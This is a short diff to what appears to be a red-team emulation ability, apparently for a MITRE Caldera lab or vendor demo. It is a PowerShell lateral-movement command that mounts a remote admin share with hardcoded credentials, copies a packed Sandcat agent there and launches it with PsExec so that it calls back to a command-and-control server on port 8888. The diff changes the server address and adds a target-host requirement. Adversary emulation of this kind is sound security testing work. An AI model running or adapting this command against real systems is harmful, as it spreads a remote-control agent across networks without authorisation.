@@ -11,7 +11,13 @@
         command: |
           net use \\172.18.24.12\C$ /user:txone tx1otdemo;
           Copy-Item -Path "C:\Users\Public\sandcat-upx.exe" -Destination "\\172.18.24.12\C$\Users\Public\" -Force;
-          Start-Process -FilePath "C:\Users\Public\psexec.exe" -ArgumentList '\\172.18.24.12', '-u', 'txone', '-p', 'tx1otdemo', 'C:\Users\Public\sandcat-upx.exe', '-server', 'http://172.16.25.10:8888', '-group', 'red' -NoNewWindow;
+          Start-Process -FilePath "C:\Users\Public\psexec.exe" -ArgumentList '\\172.18.24.12', '-u', 'txone', '-p', 'tx1otdemo', 'C:\Users\Public\sandcat-upx.exe', '-server', 'http://172.18.25.10:8888', '-group', 'red' -NoNewWindow;
         payloads:
           - sandcat-upx.exe
           - psexec.exe
+      requirements:
+        - module: fact
+          relationships:
+            - source: host.ip
+              edge: not equals
+              target: 172.18.24.12
